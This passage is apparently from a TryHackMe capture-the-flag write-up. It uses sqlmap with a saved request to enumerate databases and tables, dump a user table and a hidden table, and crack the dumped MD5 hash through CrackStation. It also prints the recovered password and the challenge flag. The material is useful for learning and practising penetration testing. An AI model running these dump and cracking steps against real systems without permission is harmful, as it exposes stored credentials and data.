`sqlmap -r request.txt`
Using sqlmap we were able to enumerate these DBs:


THM_f0und_m3, information_schema, mysql, performance_schema

`sqlmap -r request -D THM_f0und_m3 --tables`
this command will enumerate the tables under the THM_f0und_m3 db

We find 'user, nothing_inside' as tables

`sqlmap -r request -D THM_f0und_m3 -T user --dump`
This will dump all data inside the `user` table

we get an md5 hash: `05f3672ba34409136aa71b8d00070d1b`
we use crackstation and get: `cutie`


---

`sqlmap -r request -D THM_f0und_m3 -T nothing_inside --dump`
This will dump all data inside the `nothing_inside` table

We get the 4th flag: `THM{1nj3c7_l1k3_4_b055}`
